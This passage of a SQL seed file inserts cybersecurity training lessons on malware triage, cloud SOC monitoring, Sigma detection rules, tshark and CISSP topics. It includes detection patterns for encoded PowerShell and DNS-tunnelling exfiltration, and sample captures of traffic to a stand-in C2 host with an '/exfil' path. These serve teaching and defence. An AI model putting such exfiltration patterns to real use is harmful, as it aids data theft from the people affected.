+By the end of this lesson you will be able to:
+
+- Distinguish static and dynamic malware analysis.
+- Use basic static analysis techniques to assess a suspicious file.
+- Describe sandbox analysis and common sandbox tools.
+- Extract IOCs from malware analysis results.
+
+## Malware Analysis Levels
+
+| Level | Technique | Skill Required | Depth |
+|-------|-----------|---------------|-------|
+| **Triage** | File type, hash lookup, strings | Basic | Quick classification |
+| **Static analysis** | Disassembly, PE header inspection | Intermediate | Understand capabilities without executing |
+| **Dynamic analysis** | Execute in sandbox, observe behaviour | Intermediate | See what the malware actually does |
+| **Reverse engineering** | Full disassembly and code analysis | Expert | Complete understanding |
+
+SOC analysts primarily perform **triage** and **dynamic analysis** (sandboxing). Reverse engineering is for dedicated malware analysts.
+
+## Static Analysis (Triage)
+
+Without executing the file:
+
+1. **File type** — check the true file type (not just the extension). A `.pdf` that is actually a `.exe` is suspicious. Use `file` command on Linux.
+2. **Hash** — calculate MD5/SHA256 hash and check VirusTotal. If the hash is known-malicious, you have your answer.
+3. **Strings** — extract readable text from the file. Look for: URLs, IP addresses, registry paths, file paths, encoded commands, error messages.
+4. **PE headers** (for Windows executables) — check compilation timestamp, imported libraries (e.g. importing `WinHttpSendRequest` = network activity; `CryptEncrypt` = encryption).
+
+## Dynamic Analysis (Sandboxing)
+
+Execute the malware in an isolated virtual environment and observe:
+
+| Observable | What It Reveals |
+|-----------|----------------|
+| **Processes created** | What the malware spawns |
+| **Files created/modified** | Dropped payloads, persistence files |
+| **Registry changes** | Persistence mechanisms (Run keys, services) |
+| **Network connections** | C2 servers, data exfiltration destinations |
+| **DNS queries** | C2 domains, DGA (domain generation algorithm) |
+
+### Common Sandbox Tools
+
+| Tool | Type | Notes |
+|------|------|-------|
+| **Any.Run** | Cloud | Interactive sandbox; free tier available |
+| **Joe Sandbox** | Cloud/on-prem | Detailed reports |
+| **Cuckoo Sandbox** | Open-source, self-hosted | Highly customisable |
+| **Windows Sandbox** | Built into Windows Pro/Enterprise | Quick isolated environment |
+| **VirusTotal** | Cloud | Runs samples through 70+ AV engines; shows behaviour |
+
+## IOC Extraction from Analysis
+
+| IOC Type | Source |
+|----------|--------|
+| File hash (MD5, SHA256) | Static analysis |
+| C2 IP/domain | Network connections in sandbox |
+| Dropped file paths | File activity in sandbox |
+| Registry persistence keys | Registry changes in sandbox |
+| Mutex names | Process analysis in sandbox |
+| User-Agent string | Network capture in sandbox |
+
+## Key Takeaways
+
+- Triage (hash lookup, strings) takes minutes and handles most samples.
+- Sandboxes safely execute malware to observe behaviour.
+- Extract IOCs from both static and dynamic analysis to feed back into detection.
+- Never execute suspicious files outside of an isolated sandbox environment.
+$md$, 30, 4);
+
+-- ========== BH-SPEC-SOC: Module 4 — Cloud SOC and Detection Engineering ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000054', 'Cloud SOC and Monitoring',
+ 'Cloud-native logging, monitoring services, and cloud incident detection.',
+$md$
+# Cloud SOC and Monitoring
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Identify key cloud logging services (AWS CloudTrail, Azure Activity Log, GCP Cloud Audit Logs).
+- Describe how cloud events flow into a SIEM.
+- Detect common cloud threats using cloud-native telemetry.
+
+## Cloud Logging Services
+
+| Cloud | Service | What It Logs |
+|-------|---------|-------------|
+| **AWS** | CloudTrail | API calls (who did what, when, from where) |
+| **AWS** | VPC Flow Logs | Network traffic metadata |
+| **AWS** | GuardDuty | Automated threat findings |
+| **Azure** | Activity Log | Management-plane operations |
+| **Azure** | Sign-in Logs | Authentication events |
+| **Azure** | NSG Flow Logs | Network traffic metadata |
+| **GCP** | Cloud Audit Logs | Admin and data access activity |
+
+### CloudTrail Events to Monitor
+
+| Event | Why |
+|-------|-----|
+| `ConsoleLogin` without MFA | Admin access without strong authentication |
+| `CreateUser`, `AttachUserPolicy` | Potential persistence — new admin account |
+| `StopLogging` | Attacker covering tracks |
+| `PutBucketPolicy` (public access) | Data exposure |
+| `RunInstances` in unusual region | Cryptomining |
+
+## Integrating Cloud Logs with SIEM
+
+Cloud logs are forwarded to the SIEM via:
+- **AWS:** CloudTrail → S3 → SIEM ingestion (or CloudTrail → EventBridge → SIEM).
+- **Azure:** Activity Log → Event Hub → SIEM connector.
+- **GCP:** Cloud Audit Logs → Pub/Sub → SIEM.
+
+Once in the SIEM, cloud events are correlated with on-premises events for unified detection.
+
+## Common Cloud Threats
+
+| Threat | Detection |
+|--------|-----------|
+| **Credential compromise** | Impossible travel (login from two countries in 30 minutes) |
+| **Privilege escalation** | `AttachUserPolicy` with AdministratorAccess by non-admin |
+| **Data exfiltration** | Large S3 download from unusual IP |
+| **Cryptomining** | New GPU instances in unusual regions |
+| **Logging disabled** | `StopLogging` or `DeleteTrail` events |
+
+## Key Takeaways
+
+- CloudTrail (AWS), Activity Log (Azure), and Cloud Audit Logs (GCP) are the primary cloud log sources.
+- Forward cloud logs to SIEM for unified correlation with on-premises events.
+- Monitor for credential compromise, privilege escalation, data exposure, and logging tampering.
+$md$, 30, 1),
+
+('b0000000-0000-4000-8000-000000000054', 'Detection Engineering Fundamentals',
+ 'Detection lifecycle, Sigma rule syntax, rule testing, and detection coverage mapping.',
+$md$
+# Detection Engineering Fundamentals
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe the detection engineering lifecycle.
+- Write basic Sigma detection rules.
+- Explain how Sigma rules are converted to SIEM queries.
+- Map detections to the MITRE ATT&CK framework.
+- Conduct a detection gap analysis.
+
+## Detection Engineering Lifecycle
+
+1. **Threat research** — identify the attack technique to detect (e.g. via threat intelligence, ATT&CK, or incident post-mortems).
+2. **Data source identification** — what logs contain evidence of this technique? (Windows Security, Sysmon, firewall, proxy, cloud logs)
+3. **Detection logic design** — write the rule: what fields, values, and patterns to match.
+4. **Testing** — test against known-good samples (should not trigger) and known-bad samples (should trigger).
+5. **Tuning** — adjust thresholds and exclusions based on false positive rate in production.
+6. **Deployment** — push to SIEM/EDR.
+7. **Maintenance** — review and update as techniques evolve.
+
+## Sigma Rules
+
+**Sigma** is an open, vendor-neutral format for writing detection rules. A single Sigma rule can be converted to queries for Splunk, Elastic, Microsoft Sentinel, QRadar, and others.
+
+### Sigma Rule Structure (YAML)
+
+```yaml
+title: Suspicious Encoded PowerShell Execution
+id: a1234567-abcd-1234-abcd-123456789abc
+status: test
+description: Detects PowerShell execution with encoded commands
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\powershell.exe'
+        CommandLine|contains:
+            - '-enc'
+            - '-EncodedCommand'
+            - '-e '
+    condition: selection
+falsepositives:
+    - Legitimate admin scripts using encoded commands
+level: high
+tags:
+    - attack.execution
+    - attack.t1059.001
+```
+
+### Key Fields
+
+| Field | Purpose |
+|-------|---------|
+| `title` | Descriptive name |
+| `logsource` | What type of log and platform (category + product) |
+| `detection` | The matching logic (field names, values, operators) |
+| `condition` | Combines selections (AND, OR, NOT) |
+| `level` | Severity (informational, low, medium, high, critical) |
+| `tags` | MITRE ATT&CK mapping (tactic + technique) |
+
+### Sigma Modifiers
+
+- `|contains` — field value contains the string.
+- `|endswith` — field value ends with the string.
+- `|startswith` — field value starts with the string.
+- `|re` — regular expression match.
+
+### Converting Sigma to SIEM Queries
+
+The `sigma-cli` tool converts Sigma rules to SIEM-specific queries:
+
+```
+sigma convert -t splunk -p sysmon rule.yml
+# Output: Image="*\\powershell.exe" (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*")
+```
+
+This means: write once in Sigma, deploy to any SIEM.
+
+## Detection Coverage Mapping
+
+Map your detection rules to MITRE ATT&CK techniques to find gaps:
+
+| ATT&CK Technique | Detection Rule? | Data Source |
+|-------------------|----------------|-------------|
+| T1059.001 — PowerShell | Yes | Sysmon Event 1 |
+| T1053.005 — Scheduled Task | Yes | Windows Security 4698 |
+| T1548.002 — UAC Bypass | **No — gap** | Need Sysmon + specific detection |
+| T1071.001 — Web Protocols (C2) | Partial | Proxy logs, but no beacon detection |
+
+A gap analysis reveals which techniques you cannot detect — then you prioritise building those detections.
+
+## Key Takeaways
+
+- Detection engineering follows a lifecycle: research → design → test → tune → deploy → maintain.
+- Sigma is the vendor-neutral standard for detection rules — write once, convert to any SIEM.
+- Know the Sigma YAML structure: logsource, detection (selection + condition), level, tags.
+- Map detections to ATT&CK to identify gaps in your detection coverage.
+$md$, 35, 2),
+
+('b0000000-0000-4000-8000-000000000054', 'Detection Tools: tshark and Sigma Rules',
+ 'Hands-on introduction to tshark packet analysis and Sigma rule authoring for the capstone.',
+$md$
+# Detection Tools: tshark and Sigma Rules
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Use tshark to analyse PCAP files from the command line.
+- Extract specific fields from packet data using tshark.
+- Write complete Sigma detection rules in YAML format.
+- Test and validate Sigma rules.
+
+## tshark — Command-Line Packet Analysis
+
+tshark is the command-line version of Wireshark. It is useful for scripting, automation, and analysing large captures without a GUI.
+
+### Basic Usage
+
+```
+tshark -r capture.pcap                   # Read and display all packets
+tshark -r capture.pcap -c 20             # Show first 20 packets only
+tshark -r capture.pcap -q -z conv,tcp    # TCP conversation summary (quiet mode + statistics)
+tshark -r capture.pcap -q -z io,phs      # Protocol hierarchy statistics
+```
+
+### Display Filters
+
+Same syntax as Wireshark:
+
+```
+tshark -r capture.pcap -Y "http.request"              # Show HTTP requests only
+tshark -r capture.pcap -Y "dns"                        # Show DNS only
+tshark -r capture.pcap -Y "ip.addr == 10.0.0.5"       # Traffic from/to specific IP
+tshark -r capture.pcap -Y "tcp.port == 4444"           # Traffic on a specific port
+```
+
+### Field Extraction
+
+Extract specific fields in tabular format:
+
+```
+tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
+```
+
+Output:
+```
+10.0.0.5    evil-c2.example.com    /beacon
+10.0.0.5    evil-c2.example.com    /exfil?data=abc
+```
+
+### DNS Query Extraction
+
+```
+tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name
+```
+
+Output:
+```
+10.0.0.5    evil-c2.example.com
+10.0.0.5    updates.legit-software.com
+```
+
+## Writing Sigma Rules — Practical Guide
+
+### Example 1: Detect Data Exfiltration via DNS
+
+```yaml
+title: Excessive DNS Queries to Single Domain
+id: b2345678-bcde-2345-bcde-234567890bcd
+status: test
+description: Detects unusually high DNS query volume to a single domain, possible DNS tunnelling
+logsource:
+    category: dns_query
+    product: windows
+detection:
+    selection:
+        QueryName|contains: '.'
+    filter:
+        QueryName|endswith:
+            - '.microsoft.com'
+            - '.windows.com'
+            - '.windowsupdate.com'
+    condition: selection and not filter
+    timeframe: 5m
+    count(QueryName) > 100
+falsepositives:
+    - CDN domains with many subresources
+    - Software update checks
+level: medium
+tags:
+    - attack.exfiltration
+    - attack.t1048.003
+```
+
+### Example 2: Detect Service Account Interactive Logon
+
+```yaml
+title: Service Account Used for Interactive Logon
+id: c3456789-cdef-3456-cdef-345678901cde
+status: test
+description: Detects when a service account logs on interactively, which should not happen
+logsource:
+    product: windows
+    service: security
+detection:
+    selection:
+        EventID: 4624
+        LogonType: 2
+        TargetUserName|startswith: 'svc-'
+    condition: selection
+falsepositives:
+    - Legitimate administrative use of service accounts (should be eliminated)
+level: high
+tags:
+    - attack.credential_access
+    - attack.t1078.002
+```
+
+### Validating Sigma Rules
+
+- Check YAML syntax (correct indentation, no tabs).
+- Verify `logsource` matches available data.
+- Test with known-bad data (should trigger) and known-good data (should not trigger).
+- Review `falsepositives` — document expected noise.
+
+## Key Takeaways
+
+- tshark analyses PCAPs from the command line — use `-Y` for display filters, `-T fields -e` for extraction.
+- `-q -z conv,tcp` gives a conversation summary; `-q -z io,phs` gives protocol hierarchy.
+- Sigma rules follow a specific YAML structure: title, logsource, detection, condition, level, tags.
+- Write detection logic in the selection block; combine with condition; document false positives.
+$md$, 35, 3);
+
+-- ========== BH-ADV: Module 3 — Asset Security and Cryptography ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000063', 'Asset Security and Data Protection',
+ 'Data classification, lifecycle, roles, retention, privacy, and secure disposal for CISSP Domain 2.',
+$md$
+# Asset Security and Data Protection
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Apply data classification schemes and describe data roles.
+- Describe the data lifecycle and retention requirements.
+- Explain privacy concepts including PII, PHI, and data protection regulations.
+- Describe secure data disposal methods.
+
+## Data Classification
+
+Classification assigns a sensitivity label to data, which determines handling, storage, encryption, and access requirements.
+
+### Government Classification
+
+| Level | Definition |
+|-------|-----------|
+| **Top Secret** | Exceptionally grave damage to national security if disclosed |
+| **Secret** | Serious damage to national security |
+| **Confidential** | Damage to national security |
+| **Unclassified** | No damage; may still be sensitive (e.g. FOUO — For Official Use Only) |
+
+### Commercial Classification
+
+| Level | Definition | Example |
+|-------|-----------|---------|
+| **Restricted** | Highest sensitivity; severe business impact | Trade secrets, M&A plans, cryptographic keys |
+| **Confidential** | Significant impact | Customer PII, financial data, contracts |
+| **Internal** | Minor impact | Internal policies, org charts, meeting notes |
+| **Public** | No impact | Marketing materials, press releases |
+
+## Data Roles
+
+| Role | Responsibility |
+|------|---------------|
+| **Data owner** | Business leader who determines classification and access policies |
+| **Data custodian** | IT/security staff who implement technical controls (encryption, backups, access) |
+| **Data controller** (GDPR) | Organisation that determines why and how personal data is processed |
+| **Data processor** (GDPR) | Organisation that processes data on behalf of the controller |
+| **Data steward** | Ensures data quality, accuracy, and compliance |
+
+## Data Lifecycle
+
+1. **Create / Collect** — classify at creation; apply labels and initial controls.
+2. **Store** — encrypt at rest; apply access controls; store in approved locations.
+3. **Use** — enforce need-to-know; monitor access; apply DLP.
+4. **Share** — encrypt in transit; verify recipient authorisation; apply rights management.
+5. **Archive** — move to long-term storage; maintain classification; ensure retrievability.
+6. **Destroy** — securely dispose when retention period expires.
+
+## Data Retention and Disposal
+
+Retention policies define how long data must be kept. Drivers: legal requirements (tax records: 7 years), regulations (HIPAA: 6 years), business needs, litigation hold.
+
+### Secure Disposal Methods
+
+| Method | Media | Description |
+|--------|-------|-------------|
+| **Overwriting** | HDD | Write patterns over data (e.g. DoD 5220.22-M: 3-pass overwrite) |
+| **Degaussing** | Magnetic media | Strong magnetic field destroys data |
+| **Crypto-shredding** | Encrypted media | Destroy the encryption key — data becomes unrecoverable |
+| **Physical destruction** | Any | Shredding, incineration, pulverisation |
+
+**SSD note:** Overwriting is unreliable on SSDs due to wear levelling. Use crypto-shredding (encrypt then destroy key) or physical destruction.
+
+## Privacy
+
+- **PII** (Personally Identifiable Information) — data that can identify an individual (name, SSN, email, biometrics).
+- **PHI** (Protected Health Information) — health-related PII (HIPAA).
+- **Anonymisation** — irreversibly remove identifying information.
+- **Pseudonymisation** — replace identifiers with tokens (reversible with a key).
+- **Tokenisation** — replace sensitive data with a non-sensitive token stored in a secure vault.
+
+## Key Takeaways
+
+- Classification drives all downstream handling decisions — classify at creation.
+- Data owners decide policy; custodians implement controls.
+- Know the data lifecycle: create → store → use → share → archive → destroy.
+- Secure disposal must match the media type — crypto-shredding for SSDs.
+$md$, 35, 1),
+
+('b0000000-0000-4000-8000-000000000063', 'Security Models and Evaluation Criteria',
+ 'Bell-LaPadula, Biba, Clark-Wilson, Common Criteria, and trusted computing for CISSP Domain 3.',
+$md$
+# Security Models and Evaluation Criteria
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe formal security models: Bell-LaPadula, Biba, Clark-Wilson, and Brewer-Nash.
+- Explain Common Criteria and Evaluation Assurance Levels (EAL).
+- Describe trusted computing concepts: TPM, secure boot, HSM.
+
+## Security Models
+
+### Bell-LaPadula (Confidentiality)
+
+Designed to protect classified information. Two rules:
+
+- **Simple Security Rule (No Read Up)** — a subject cannot read data at a higher classification level.
+- **Star Property (No Write Down)** — a subject cannot write data to a lower classification level.
+
+This prevents information from flowing downward (leaking secrets to lower-classified systems).
+
+### Biba (Integrity)
+
+The inverse of Bell-LaPadula, focused on data integrity:
+
+- **Simple Integrity Rule (No Read Down)** — a subject cannot read data at a lower integrity level.
+- **Star Integrity Property (No Write Up)** — a subject cannot write data to a higher integrity level.
+
+This prevents corruption from flowing upward (unreliable data contaminating trusted systems).
+
+### Clark-Wilson (Integrity — Commercial)
+
+Designed for commercial environments. Uses:
+
+- **Constrained Data Items (CDIs)** — data that must maintain integrity.
+- **Transformation Procedures (TPs)** — the only authorised way to modify CDIs.
+- **Integrity Verification Procedures (IVPs)** — check that CDIs remain valid.
+- **Separation of duties** — no single person controls a complete transaction.
+
+### Brewer-Nash (Chinese Wall)
+
+Prevents conflicts of interest. A consultant who accesses data from Company A (in the banking sector) cannot then access data from Company B (another bank). Access is dynamically restricted based on what the subject has already accessed.
+
+## Common Criteria (ISO 15408)
+
+An international framework for evaluating the security of IT products. Key concepts:
+
+- **Target of Evaluation (TOE)** — the product being evaluated.
+- **Protection Profile (PP)** — requirements document specifying what the product must do.
+- **Security Target (ST)** — vendor's description of what the product does and how.
+- **Evaluation Assurance Level (EAL)** — 1 (lowest) to 7 (highest).
+
+| EAL | Description |
+|-----|-------------|
+| EAL 1 | Functionally tested |
+| EAL 2 | Structurally tested |
+| EAL 3 | Methodically tested and checked |
+| EAL 4 | Methodically designed, tested, and reviewed (most common for commercial products) |
+| EAL 5-7 | Formally verified (increasingly rigorous; rare outside military) |
+
+## Trusted Computing
+
+| Component | Purpose |
+|-----------|---------|
+| **TPM (Trusted Platform Module)** | Hardware chip that stores cryptographic keys, performs encryption, and measures system integrity |
+| **Secure Boot** | UEFI feature that only allows signed bootloaders and OS kernels to execute |
+| **Measured Boot** | Records integrity measurements of boot components in the TPM; allows remote attestation |
+| **HSM (Hardware Security Module)** | Dedicated hardware for key generation, storage, and cryptographic operations at high speed |
+
+## Key Takeaways
+
+- Bell-LaPadula = confidentiality (no read up, no write down). Biba = integrity (no read down, no write up).
+- Clark-Wilson enforces integrity through controlled access to data via authorised procedures.
+- Common Criteria EAL levels rate the assurance of IT product security (EAL4 is the commercial standard).
+- TPM, Secure Boot, and HSM provide hardware-based security foundations.
+$md$, 30, 2),
+
+('b0000000-0000-4000-8000-000000000063', 'Cryptographic Systems and PKI',
+ 'Cryptography at CISSP depth: algorithms, PKI, key management, and digital signatures.',
+$md$
+# Cryptographic Systems and PKI
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Compare symmetric and asymmetric algorithms at CISSP depth.
+- Describe the PKI trust model: CAs, certificates, and revocation.
+- Explain key management lifecycle.
+- Describe digital signatures and their role in non-repudiation.
+
+## Symmetric Algorithms
+
+| Algorithm | Key Size | Block Size | Status |
+|-----------|---------|-----------|--------|
+| **AES** | 128, 192, 256 | 128 | Current standard; approved by NIST |
+| **3DES** | 168 (effective 112) | 64 | Deprecated; too slow; retire by 2023 (NIST) |
+| **DES** | 56 | 64 | Broken; never use |
+| **ChaCha20** | 256 | Stream cipher | Modern alternative to AES; used in TLS |
+
+AES modes: **CBC** (chaining, needs IV), **GCM** (authenticated encryption — provides both confidentiality and integrity), **CTR** (counter mode, parallelisable).
+
+## Asymmetric Algorithms
+
+| Algorithm | Use | Key Size | Status |
+|-----------|-----|---------|--------|
+| **RSA** | Encryption, digital signatures | 2048–4096 | Standard; 2048 minimum |
+| **ECC** | Encryption, signatures, key exchange | 256–521 | Smaller keys, same security as larger RSA |
+| **Diffie-Hellman** | Key exchange only | 2048+ | Establishes shared secret over insecure channel |
+| **DSA** | Digital signatures only | 2048–3072 | Standardised by NIST |
+
+## Public Key Infrastructure (PKI)
+
+PKI provides the trust framework for asymmetric cryptography in practice.
+
+### Components
+
+| Component | Role |
+|-----------|------|
+| **Certificate Authority (CA)** | Issues and signs digital certificates |
+| **Registration Authority (RA)** | Verifies identity of certificate requesters |
+| **Certificate** | Binds a public key to an identity (X.509 format) |
+| **CRL (Certificate Revocation List)** | List of revoked certificates |
+| **OCSP (Online Certificate Status Protocol)** | Real-time certificate validity check |
+
+### Certificate Chain of Trust
+
+Root CA → Intermediate CA → End-entity certificate. Browsers trust root CAs that are pre-installed in their trust store. If any certificate in the chain is invalid or revoked, the entire chain fails.
+
+## Key Management Lifecycle
+
+1. **Generation** — use strong random number generators; appropriate key length.
+2. **Distribution** — secure key exchange (Diffie-Hellman, out-of-band, key wrapping).
+3. **Storage** — protect keys at rest (HSM, TPM, encrypted key store).
+4. **Usage** — enforce access controls; monitor usage.
+5. **Rotation** — change keys periodically to limit exposure.
+6. **Revocation** — invalidate compromised keys immediately.
+7. **Destruction** — securely destroy keys when no longer needed (crypto-shredding).
+
+## Digital Signatures
+
+A digital signature provides: **integrity** (data not modified), **authentication** (sender is who they claim), and **non-repudiation** (sender cannot deny sending).
+
+Process:
+1. Sender hashes the message (e.g. SHA-256).
+2. Sender encrypts the hash with their **private key** → this is the signature.
+3. Recipient decrypts the signature with the sender's **public key** → gets the hash.
+4. Recipient hashes the received message and compares. If hashes match → integrity and authenticity confirmed.
+
+## Key Takeaways
+
+- AES (symmetric) and RSA/ECC (asymmetric) are the current standards. Know key sizes.
+- PKI trust chain: Root CA → Intermediate CA → End certificate. Revocation via CRL or OCSP.
+- Key management lifecycle: generate → distribute → store → use → rotate → revoke → destroy.
+- Digital signatures use the sender's private key for signing and public key for verification.
+$md$, 35, 3);
+
+-- ========== BH-ADV: Module 4 — Network Security and Software Security ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000064', 'Communication and Network Security',
+ 'Secure network architecture, protocols, and attacks for CISSP Domain 4.',
+$md$
+# Communication and Network Security
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe secure network architecture principles at CISSP depth.
+- Explain secure communication protocols (IPSec, TLS, SSH).
+- Identify common network attacks and their mitigations.
+- Describe network segmentation strategies including micro-segmentation and SDN.
+
+## Secure Network Architecture
+
+### Defence in Depth for Networks
+
+- **Perimeter** — firewall, IDS/IPS, DDoS protection.
+- **DMZ** — screened subnet for public-facing services (web servers, email gateways).
+- **Internal segmentation** — VLANs, internal firewalls, ACLs separate departments and security zones.
+- **Micro-segmentation** — granular policies between individual workloads (especially in cloud/virtualised environments).
+- **Zero trust network** — verify every connection regardless of location; no implicit trust.
+
+### Converged Protocols
+
+| Protocol | Description |
+|----------|-------------|
+| **FCoE** (Fibre Channel over Ethernet) | Storage traffic on Ethernet (converges SAN and LAN) |
+| **iSCSI** | SCSI storage protocol over IP |
+| **VoIP** | Voice over IP (SIP, RTP) — requires QoS and VLAN isolation |
+
+## Secure Communication Protocols
+
+### IPSec
+
+Operates at Layer 3. Two modes:
+- **Transport mode** — encrypts only the payload (original IP header preserved). Used for host-to-host.
+- **Tunnel mode** — encrypts the entire original packet and adds a new IP header. Used for VPNs.
+
+Components:
+- **AH (Authentication Header)** — integrity and authentication (no encryption).
+- **ESP (Encapsulating Security Payload)** — integrity, authentication, **and encryption**.
+- **IKE (Internet Key Exchange)** — negotiates the security association (SA).
+
+### TLS (Transport Layer Security)
+
+Operates at Layer 4–5. Provides encryption for web traffic (HTTPS), email (SMTPS, IMAPS), and other protocols. TLS 1.3 is the current standard — removed weak cipher suites, reduced handshake to one round trip.
+
+### SSH (Secure Shell)
+
+Encrypted remote access (port 22). Replaces Telnet (plaintext). Supports password and public key authentication.
+
+## Common Network Attacks
+
+| Attack | Description | Mitigation |
+|--------|-------------|-----------|
+| **DDoS** | Overwhelm target with traffic | DDoS protection services, rate limiting, geo-blocking |
+| **ARP spoofing** | Poison ARP cache to redirect traffic | Dynamic ARP Inspection (DAI), static ARP entries |
+| **DNS poisoning** | Insert fake DNS records | DNSSEC, DNS monitoring |
+| **MITM (on-path)** | Intercept communications | Encryption (TLS/IPSec), certificate pinning |
+| **VLAN hopping** | Escape one VLAN to access another | Disable DTP, prune unused VLANs on trunks |
+| **Session hijacking** | Steal or predict session tokens | Secure session management, TLS, token rotation |
+
+## Software-Defined Networking (SDN)
+
+SDN separates the **control plane** (routing decisions) from the **data plane** (packet forwarding). A centralised SDN controller programmes network devices via APIs.
+
+Security implications:
+- **Benefit:** Rapid, automated policy deployment; micro-segmentation; network-wide visibility.
+- **Risk:** The controller is a single point of failure and a high-value target. Controller compromise = network compromise.
+
+## Key Takeaways
+
+- Network security uses defence in depth: perimeter, DMZ, internal segmentation, micro-segmentation.
+- IPSec tunnel mode for VPNs; ESP provides encryption; TLS 1.3 is the web standard.
+- Know the common attacks (DDoS, ARP spoofing, DNS poisoning, MITM) and their mitigations.
+- SDN centralises network control — benefits automation but introduces single-point-of-failure risk.
+$md$, 35, 1),
+
+('b0000000-0000-4000-8000-000000000064', 'Software Development Security',
+ 'SDLC, secure coding, OWASP, API security, and DevSecOps for CISSP Domain 8.',
+$md$
+# Software Development Security
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe secure SDLC and where security activities fit in each phase.
+- Explain the OWASP Top 10 at a management level.
+- Describe application security testing methods (SAST, DAST, IAST, SCA).
+- Explain API security and software supply chain security.
+- Describe DevSecOps and shift-left security.
+
+## Secure Software Development Lifecycle (SSDLC)
+
+| SDLC Phase | Security Activity |
+|-----------|------------------|
+| **Requirements** | Security requirements, abuse cases, compliance requirements |
+| **Design** | Threat modelling (STRIDE, PASTA), security architecture review |
+| **Implementation** | Secure coding standards, code review, SAST |
+| **Testing** | DAST, penetration testing, fuzz testing |
+| **Deployment** | Configuration hardening, secrets management, SBOM |
+| **Maintenance** | Vulnerability management, patching, monitoring |
+
+### Threat Modelling
+
+| Method | Focus |
+|--------|-------|
+| **STRIDE** | Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege |
+| **PASTA** | Process for Attack Simulation and Threat Analysis (7-stage, risk-centric) |
+| **Attack trees** | Visual decomposition of attack goals into sub-goals |
+| **DREAD** | Damage, Reproducibility, Exploitability, Affected users, Discoverability (risk rating) |
+
+## Application Security Testing
+
+| Method | When | How |
+|--------|------|-----|
+| **SAST** (Static) | During development | Analyses source code without executing |
+| **DAST** (Dynamic) | During testing | Tests running application from outside (like an attacker) |
+| **IAST** (Interactive) | During testing | Agent inside the application monitors during testing |
+| **SCA** (Software Composition Analysis) | During build | Checks third-party libraries for known vulnerabilities |
+| **SBOM** (Software Bill of Materials) | At release | Inventory of all components in the software |
+
+## API Security
+
+APIs are the backbone of modern applications. Security considerations:
+
+- **Authentication** — API keys, OAuth 2.0 tokens, mutual TLS.
+- **Authorisation** — enforce least privilege per API endpoint.
+- **Rate limiting** — prevent abuse and DDoS.
+- **Input validation** — APIs are just as vulnerable to injection as web forms.
+- **Logging** — log all API calls for audit and detection.
+
+## DevSecOps and Shift-Left
+
+**Shift-left** means moving security earlier in the development process (left on the timeline). Instead of testing security at the end, integrate it throughout:
+
+- **Pre-commit:** SAST in the IDE, secret scanning.
+- **CI pipeline:** Automated SAST, SCA, container scanning on every build.
+- **CD pipeline:** DAST against staging environment, configuration compliance checks.
+- **Production:** Runtime monitoring, WAF, SIEM integration.
+
+## Key Takeaways
+
+- Security must be integrated into every SDLC phase — not bolted on at the end.
+- STRIDE is the most widely used threat modelling framework.
+- SAST analyses code; DAST tests the running app; SCA checks dependencies.
+- API security requires authentication, authorisation, rate limiting, and input validation.
+- DevSecOps automates security testing in CI/CD pipelines (shift-left).
+$md$, 35, 2);
+
+-- ========== BH-ADV: Module 5 — Security Assessment, Operations, and Incident Management ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000065', 'Security Assessment and Testing',
+ 'Penetration testing methodologies, audit types, and security metrics for CISSP Domain 6.',
+$md$
+# Security Assessment and Testing
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe penetration testing methodologies and types.
+- Explain security audit types (internal, external, third-party, SOC reports).
+- Describe security assessment strategies and their management.
+- Define key security metrics and KPIs.
+
+## Penetration Testing
+
+Penetration testing simulates real-world attacks to identify exploitable vulnerabilities.
+
+### Types
+
+| Type | Tester Knowledge | Simulates |
+|------|-----------------|-----------|
+| **Black box** | No prior knowledge of the target | External attacker |
+| **White box** | Full knowledge (source code, network diagrams) | Insider or thorough assessment |
+| **Grey box** | Partial knowledge (user credentials, some docs) | Compromised user or contractor |
+
+### Methodology (PTES Framework)
+
+1. Pre-engagement — scope, rules of engagement, legal authorisation.
+2. Intelligence gathering — reconnaissance.
+3. Threat modelling — identify targets and attack vectors.
+4. Vulnerability analysis — identify weaknesses.
+5. Exploitation — attempt to exploit vulnerabilities.
+6. Post-exploitation — determine what an attacker could achieve.
+7. Reporting — findings, evidence, risk ratings, and recommendations.
+
+### Rules of Engagement
+
+The ROE document specifies: what is in scope and out of scope, testing hours, prohibited techniques (e.g. no social engineering, no DDoS), emergency contacts, and data handling requirements.
+
+## Security Audits
+
+| Audit Type | Conducted By | Purpose |
+|-----------|-------------|---------|
+| **Internal audit** | Organisation's own audit team | Assess control effectiveness |
+| **External audit** | Independent third-party auditor | Regulatory compliance, certification |
+| **SOC 1 (Type I/II)** | Independent auditor | Financial reporting controls |
+| **SOC 2 (Type I/II)** | Independent auditor | Trust Service Criteria (security, availability, processing integrity, confidentiality, privacy) |
+| **SOC 3** | Independent auditor | Public-facing summary of SOC 2 |
+
+Type I = design and existence of controls at a point in time.
+Type II = design and **operating effectiveness** over a period (usually 6–12 months). Type II is more rigorous and more valued.
+
+## Security Metrics
+
+| Metric | Description |
+|--------|-------------|
+| **MTTD** (Mean Time to Detect) | Average time from compromise to detection |
+| **MTTR** (Mean Time to Respond) | Average time from detection to containment |
+| **Dwell time** | Total time attacker is in the environment (MTTD + MTTR) |
+| **False positive rate** | Percentage of alerts that are not real threats |
